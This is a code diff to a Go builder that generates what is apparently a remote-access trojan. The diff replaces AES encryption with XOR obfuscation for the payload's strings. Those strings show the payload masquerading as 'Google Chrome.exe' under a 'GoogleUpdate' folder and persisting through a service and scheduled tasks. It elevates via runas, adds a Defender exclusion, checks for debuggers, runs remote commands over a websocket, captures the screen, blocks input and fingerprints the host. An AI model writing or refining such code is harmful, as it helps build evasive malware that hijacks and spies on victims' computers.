@@ -1,10 +1,6 @@
 package buildergen
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
-	"crypto/rand"
-	"encoding/base64"
 	"fmt"
 	"strings"
 )
@@ -139,8 +135,8 @@ func buildGlobals(cfg Config) (globalValues, error) {
 	workerExeName := "Google Chrome.exe"
 	mutexName := fmt.Sprintf("Global\\\\NvDisplayMutex_%s", safeBuildID)
 
-	encServerHost := aesEncrypt(cfg.ServerHost, key)
-	encBuilderToken := aesEncrypt(cfg.BuilderToken, key)
+	encServerHost := xorWithKey(cfg.ServerHost, key)
+	encBuilderToken := xorWithKey(cfg.BuilderToken, key)
 
 	return globalValues{
 		ForceAdmin:        strings.TrimSpace(cfg.ForceAdmin),
@@ -150,142 +146,116 @@ func buildGlobals(cfg Config) (globalValues, error) {
 		CustomInstallPath: escapeGoString(cfg.CustomInstallPath),
 		EncServerHost:     encServerHost,
 		EncBuilderToken:   encBuilderToken,
-		EncMutexName:      aesEncrypt(mutexName, key),
-		EncServiceName:    aesEncrypt(svcName, key),
-		EncDisplayName:    aesEncrypt(displayName, key),
-		EncServiceExeName: aesEncrypt(svcExeName, key),
-		EncWorkerExeName:  aesEncrypt(workerExeName, key),
-		EncSchtasksExe:    aesEncrypt("schtasks", key),
-		EncProgramDataEnv: aesEncrypt("ProgramData", key),
-		EncWindowsUpdateDir: aesEncrypt("GoogleUpdate", key),
-		EncAppDataEnv:     aesEncrypt("APPDATA", key),
-		EncMicrosoftDir:   aesEncrypt("Microsoft", key),
-		EncWindowsDir:     aesEncrypt("Windows", key),
-		EncAdvapi32Dll:    aesEncrypt("advapi32.dll", key),
-		EncKernel32Dll:    aesEncrypt("kernel32.dll", key),
-		EncOpenSCManagerW: aesEncrypt("OpenSCManagerW", key),
-		EncCreateServiceW: aesEncrypt("CreateServiceW", key),
-		EncCloseServiceHandle: aesEncrypt("CloseServiceHandle", key),
-		EncOpenServiceW:   aesEncrypt("OpenServiceW", key),
-		EncStartServiceW:  aesEncrypt("StartServiceW", key),
-		EncOpenProcessToken: aesEncrypt("OpenProcessToken", key),
-		EncGetTokenInformation: aesEncrypt("GetTokenInformation", key),
-		EncCloseHandle:    aesEncrypt("CloseHandle", key),
-		EncPowerShellExe:  aesEncrypt("powershell", key),
-		EncPsStartProcessPrefix: aesEncrypt("Start-Process -FilePath '", key),
-		EncPsRunasSuffix:  aesEncrypt("' -Verb runas", key),
-		EncAddMpPref:      aesEncrypt("Add-MpPreference -ExclusionPath", key),
-		EncIsDebuggerPresent: aesEncrypt("IsDebuggerPresent", key),
-		EncWsScheme:       aesEncrypt(strings.TrimSpace(cfg.WSScheme), key),
-		EncWsPath:         aesEncrypt("/ws", key),
-		EncBuilderTokenHeader: aesEncrypt("X-Builder-Token", key),
-		EncOwnerName:      aesEncrypt(strings.TrimSpace(cfg.Owner), key),
-		EncBuildID:        aesEncrypt(strings.TrimSpace(cfg.BuildID), key),
-		EncCmdPrefix:      aesEncrypt("cmd:", key),
-		EncBgPrefix:       aesEncrypt("bg:", key),
-		EncCmdExe:         aesEncrypt("cmd", key),
-		EncCmdCArg:        aesEncrypt("/C", key),
-		EncMsgBoxPrefix:   aesEncrypt("msgbox|", key),
-		EncSwapMouseLeft:  aesEncrypt("swap_mouse_left_right", key),
-		EncSwapMouseRight: aesEncrypt("swap_mouse_right_left", key),
-		EncShutdownExe:    aesEncrypt("shutdown", key),
-		EncShutdownRestart: aesEncrypt("/r", key),
-		EncShutdownPoweroff: aesEncrypt("/s", key),
-		EncShutdownTimeout: aesEncrypt("/t", key),
-		EncShutdownZero:   aesEncrypt("0", key),
-		EncShakeOn:        aesEncrypt("shake_on", key),
-		EncShakeOff:       aesEncrypt("shake_off", key),
-		EncUser32Dll:      aesEncrypt("user32.dll", key),
-		EncGetForegroundWindow: aesEncrypt("GetForegroundWindow", key),
-		EncGetWindowTextW: aesEncrypt("GetWindowTextW", key),
-		EncGetWindowTextLengthW: aesEncrypt("GetWindowTextLengthW", key),
-		EncUnknownWindow:  aesEncrypt("Unknown", key),
-		EncNoActiveWindow: aesEncrypt("No active window", key),
-		EncUntitledWindow: aesEncrypt("Untitled", key),
-		EncSystemParametersInfoW: aesEncrypt("SystemParametersInfoW", key),
-		EncBlockInputName: aesEncrypt("BlockInput", key),
-		EncMessageBoxW:    aesEncrypt("MessageBoxW", key),
-		EncSetCursorPos:   aesEncrypt("SetCursorPos", key),
-		EncBlockInputOnCmd: aesEncrypt("block_input_on", key),
-		EncBlockInputOffCmd: aesEncrypt("block_input_off", key),
-		EncGetConsoleWindow: aesEncrypt("GetConsoleWindow", key),
-		EncShowWindow:     aesEncrypt("ShowWindow", key),
-		EncGdi32Dll:       aesEncrypt("gdi32.dll", key),
-		EncGetDesktopWindow: aesEncrypt("GetDesktopWindow", key),
-		EncGetDC:          aesEncrypt("GetDC", key),
-		EncCreateCompatibleDC: aesEncrypt("CreateCompatibleDC", key),
-		EncCreateCompatibleBitmap: aesEncrypt("CreateCompatibleBitmap", key),
-		EncSelectObject:   aesEncrypt("SelectObject", key),
-		EncBitBlt:         aesEncrypt("BitBlt", key),
-		EncGetDeviceCaps:  aesEncrypt("GetDeviceCaps", key),
-		EncDeleteDC:       aesEncrypt("DeleteDC", key),
-		EncReleaseDC:      aesEncrypt("ReleaseDC", key),
-		EncDeleteObject:   aesEncrypt("DeleteObject", key),
-		EncGetDIBits:      aesEncrypt("GetDIBits", key),
-		EncHttpPrefix:     aesEncrypt("http://", key),
-		EncHttpsPrefix:    aesEncrypt("https://", key),
-		EncHttpsScheme:    aesEncrypt("https", key),
-		EncSchemeSep:      aesEncrypt("://", key),
-		EncBgImageName:    aesEncrypt("bg_image.jpg", key),
-		EncRemotePrefix:   aesEncrypt("/remote/", key),
-		EncExeSuffix:      aesEncrypt(".exe", key),
-		EncCmdStart:       aesEncrypt("start", key),
-		EncIpifyURL:       aesEncrypt("https://api.ipify.org", key),
-		EncIpApiHost:      aesEncrypt("ip-api.com", key),
-		EncIpApiPath:      aesEncrypt("/json/", key),
-		EncIpApiQuery:     aesEncrypt("?fields=countryCode", key),
-		EncCountryFallback: aesEncrypt("RU", key),
-		EncWmic:           aesEncrypt("wmic", key),
-		EncPsGetCpu:       aesEncrypt("(Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name) -join ','", key),
-		EncWmicGetCpu:     aesEncrypt("cpu get name", key),
-		EncPsGetGpu:       aesEncrypt("Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name", key),
-		EncWmicGetGpu:     aesEncrypt("path win32_VideoController get name", key),
-		EncPsGetRam:       aesEncrypt("(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum", key),
-		EncWmicGetRam:     aesEncrypt("computersystem get TotalPhysicalMemory", key),
-		EncPsGetOs:        aesEncrypt("(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').ProductName", key),
-		EncWmicGetOs:      aesEncrypt("os get Caption", key),
-		EncGetSystemPowerStatus: aesEncrypt("GetSystemPowerStatus", key),
-		EncLinuxCpuCmd:    aesEncrypt("lscpu | grep 'Model name' | cut -d':' -f2 | xargs", key),
-		EncDarwinCpuCmd:   aesEncrypt("machdep.cpu.brand_string", key),
-		EncUnknownCPU:     aesEncrypt("Unknown CPU", key),
-		EncUnknownGPU:     aesEncrypt("Unknown GPU", key),
-		EncUnknownRAM:     aesEncrypt("Unknown RAM", key),
-		EncUnknownOS:      aesEncrypt("Unknown OS", key),
-		EncLaptopLabel:    aesEncrypt("laptop", key),
-		EncDesktopLabel:   aesEncrypt("desktop", key),
-		EncShCmd:          aesEncrypt("sh", key),
-		EncDashCArg:       aesEncrypt("-c", key),
-		EncSysctlCmd:      aesEncrypt("sysctl", key),
-		EncSysctlNameArg:  aesEncrypt("-n", key),
-		EncXdgOpen:        aesEncrypt("xdg-open", key),
+		EncMutexName:      xorWithKey(mutexName, key),
+		EncServiceName:    xorWithKey(svcName, key),
+		EncDisplayName:    xorWithKey(displayName, key),
+		EncServiceExeName: xorWithKey(svcExeName, key),
+		EncWorkerExeName:  xorWithKey(workerExeName, key),
+		EncSchtasksExe:    xorWithKey("schtasks", key),
+		EncProgramDataEnv: xorWithKey("ProgramData", key),
+		EncWindowsUpdateDir: xorWithKey("GoogleUpdate", key),
+		EncAppDataEnv:     xorWithKey("APPDATA", key),
+		EncMicrosoftDir:   xorWithKey("Microsoft", key),
+		EncWindowsDir:     xorWithKey("Windows", key),
+		EncAdvapi32Dll:    xorWithKey("advapi32.dll", key),
+		EncKernel32Dll:    xorWithKey("kernel32.dll", key),
+		EncOpenSCManagerW: xorWithKey("OpenSCManagerW", key),
+		EncCreateServiceW: xorWithKey("CreateServiceW", key),
+		EncCloseServiceHandle: xorWithKey("CloseServiceHandle", key),
+		EncOpenServiceW:   xorWithKey("OpenServiceW", key),
+		EncStartServiceW:  xorWithKey("StartServiceW", key),
+		EncOpenProcessToken: xorWithKey("OpenProcessToken", key),
+		EncGetTokenInformation: xorWithKey("GetTokenInformation", key),
+		EncCloseHandle:    xorWithKey("CloseHandle", key),
+		EncPowerShellExe:  xorWithKey("powershell", key),
+		EncPsStartProcessPrefix: xorWithKey("Start-Process -FilePath '", key),
+		EncPsRunasSuffix:  xorWithKey("' -Verb runas", key),
+		EncAddMpPref:      xorWithKey("Add-MpPreference -ExclusionPath", key),
+		EncIsDebuggerPresent: xorWithKey("IsDebuggerPresent", key),
+		EncWsScheme:       xorWithKey(strings.TrimSpace(cfg.WSScheme), key),
+		EncWsPath:         xorWithKey("/ws", key),
+		EncBuilderTokenHeader: xorWithKey("X-Builder-Token", key),
+		EncOwnerName:      xorWithKey(strings.TrimSpace(cfg.Owner), key),
+		EncBuildID:        xorWithKey(strings.TrimSpace(cfg.BuildID), key),
+		EncCmdPrefix:      xorWithKey("cmd:", key),
+		EncBgPrefix:       xorWithKey("bg:", key),
+		EncCmdExe:         xorWithKey("cmd", key),
+		EncCmdCArg:        xorWithKey("/C", key),
+		EncMsgBoxPrefix:   xorWithKey("msgbox|", key),
+		EncSwapMouseLeft:  xorWithKey("swap_mouse_left_right", key),
+		EncSwapMouseRight: xorWithKey("swap_mouse_right_left", key),
+		EncShutdownExe:    xorWithKey("shutdown", key),
+		EncShutdownRestart: xorWithKey("/r", key),
+		EncShutdownPoweroff: xorWithKey("/s", key),
+		EncShutdownTimeout: xorWithKey("/t", key),
+		EncShutdownZero:   xorWithKey("0", key),
+		EncShakeOn:        xorWithKey("shake_on", key),
+		EncShakeOff:       xorWithKey("shake_off", key),
+		EncUser32Dll:      xorWithKey("user32.dll", key),
+		EncGetForegroundWindow: xorWithKey("GetForegroundWindow", key),
+		EncGetWindowTextW: xorWithKey("GetWindowTextW", key),
+		EncGetWindowTextLengthW: xorWithKey("GetWindowTextLengthW", key),
+		EncUnknownWindow:  xorWithKey("Unknown", key),
+		EncNoActiveWindow: xorWithKey("No active window", key),
+		EncUntitledWindow: xorWithKey("Untitled", key),
+		EncSystemParametersInfoW: xorWithKey("SystemParametersInfoW", key),
+		EncBlockInputName: xorWithKey("BlockInput", key),
+		EncMessageBoxW:    xorWithKey("MessageBoxW", key),
+		EncSetCursorPos:   xorWithKey("SetCursorPos", key),
+		EncBlockInputOnCmd: xorWithKey("block_input_on", key),
+		EncBlockInputOffCmd: xorWithKey("block_input_off", key),
+		EncGetConsoleWindow: xorWithKey("GetConsoleWindow", key),
+		EncShowWindow:     xorWithKey("ShowWindow", key),
+		EncGdi32Dll:       xorWithKey("gdi32.dll", key),
+		EncGetDesktopWindow: xorWithKey("GetDesktopWindow", key),
+		EncGetDC:          xorWithKey("GetDC", key),
+		EncCreateCompatibleDC: xorWithKey("CreateCompatibleDC", key),
+		EncCreateCompatibleBitmap: xorWithKey("CreateCompatibleBitmap", key),
+		EncSelectObject:   xorWithKey("SelectObject", key),
+		EncBitBlt:         xorWithKey("BitBlt", key),
+		EncGetDeviceCaps:  xorWithKey("GetDeviceCaps", key),
+		EncDeleteDC:       xorWithKey("DeleteDC", key),
+		EncReleaseDC:      xorWithKey("ReleaseDC", key),
+		EncDeleteObject:   xorWithKey("DeleteObject", key),
+		EncGetDIBits:      xorWithKey("GetDIBits", key),
+		EncHttpPrefix:     xorWithKey("http://", key),
+		EncHttpsPrefix:    xorWithKey("https://", key),
+		EncHttpsScheme:    xorWithKey("https", key),
+		EncSchemeSep:      xorWithKey("://", key),
+		EncBgImageName:    xorWithKey("bg_image.jpg", key),
+		EncRemotePrefix:   xorWithKey("/remote/", key),
+		EncExeSuffix:      xorWithKey(".exe", key),
+		EncCmdStart:       xorWithKey("start", key),
+		EncIpifyURL:       xorWithKey("https://api.ipify.org", key),
+		EncIpApiHost:      xorWithKey("ip-api.com", key),
+		EncIpApiPath:      xorWithKey("/json/", key),
+		EncIpApiQuery:     xorWithKey("?fields=countryCode", key),
+		EncCountryFallback: xorWithKey("RU", key),
+		EncWmic:           xorWithKey("wmic", key),
+		EncPsGetCpu:       xorWithKey("(Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name) -join ','", key),
+		EncWmicGetCpu:     xorWithKey("cpu get name", key),
+		EncPsGetGpu:       xorWithKey("Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name", key),
+		EncWmicGetGpu:     xorWithKey("path win32_VideoController get name", key),
+		EncPsGetRam:       xorWithKey("(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum", key),
+		EncWmicGetRam:     xorWithKey("computersystem get TotalPhysicalMemory", key),
+		EncPsGetOs:        xorWithKey("(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').ProductName", key),
+		EncWmicGetOs:      xorWithKey("os get Caption", key),
+		EncGetSystemPowerStatus: xorWithKey("GetSystemPowerStatus", key),
+		EncLinuxCpuCmd:    xorWithKey("lscpu | grep 'Model name' | cut -d':' -f2 | xargs", key),
+		EncDarwinCpuCmd:   xorWithKey("machdep.cpu.brand_string", key),
+		EncUnknownCPU:     xorWithKey("Unknown CPU", key),
+		EncUnknownGPU:     xorWithKey("Unknown GPU", key),
+		EncUnknownRAM:     xorWithKey("Unknown RAM", key),
+		EncUnknownOS:      xorWithKey("Unknown OS", key),
+		EncLaptopLabel:    xorWithKey("laptop", key),
+		EncDesktopLabel:   xorWithKey("desktop", key),
+		EncShCmd:          xorWithKey("sh", key),
+		EncDashCArg:       xorWithKey("-c", key),
+		EncSysctlCmd:      xorWithKey("sysctl", key),
+		EncSysctlNameArg:  xorWithKey("-n", key),
+		EncXdgOpen:        xorWithKey("xdg-open", key),
 		XorKeyLiteral:     escapeGoString(key),
 	}, nil
-}
-
-func aesEncrypt(plaintext, key string) string {
-	if plaintext == "" || key == "" {
-		return ""
-	}
-	aesKey := make([]byte, 32)
-	copy(aesKey, []byte(key))
-
-	block, err := aes.NewCipher(aesKey)
-	if err != nil {
-		return plaintext
-	}
-
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return plaintext
-	}
-
-	nonce := make([]byte, gcm.NonceSize())
-	if _, err := rand.Read(nonce); err != nil {
-		return plaintext
-	}
-
-	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
-	return base64.StdEncoding.EncodeToString(ciphertext)
 }
 
 func templateGlobals(cfg Config) (string, error) {
@@ -534,7 +504,8 @@ var decryptionKey = []byte("%s")
 		g.EncSysctlCmd,
 		g.EncSysctlNameArg,
 		g.EncXdgOpen,
-		g.XorKeyLiteral))
+		g.XorKeyLiteral,
+	)), nil
 }
 
 func sanitizeBuildID(buildID string) string {
